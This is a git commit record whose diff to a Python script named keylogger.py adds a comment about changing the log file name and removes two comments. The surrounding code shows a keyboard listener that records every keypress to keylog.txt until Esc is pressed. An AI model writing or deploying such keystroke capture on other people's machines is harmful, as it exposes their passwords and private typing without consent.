55325936ca81407842cd45d42fbf15e7ae36d4d8
Roshan Ajith <roshanajith7911@gmail.com>
2024-09-25 02:54:44 +0530

    keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -3,6 +3,7 @@ import logging
 
 # Set up logging configuration
 logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
+# You can make changes in the filename to change the file name or even add a specific file locations 
 
 def on_press(key):
     try:
@@ -12,11 +13,9 @@ def on_press(key):
 
 def on_release(key):
     if key == keyboard.Key.esc:
-        # Stop listener
         return False
 
 def main():
-    # Collect events until released
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
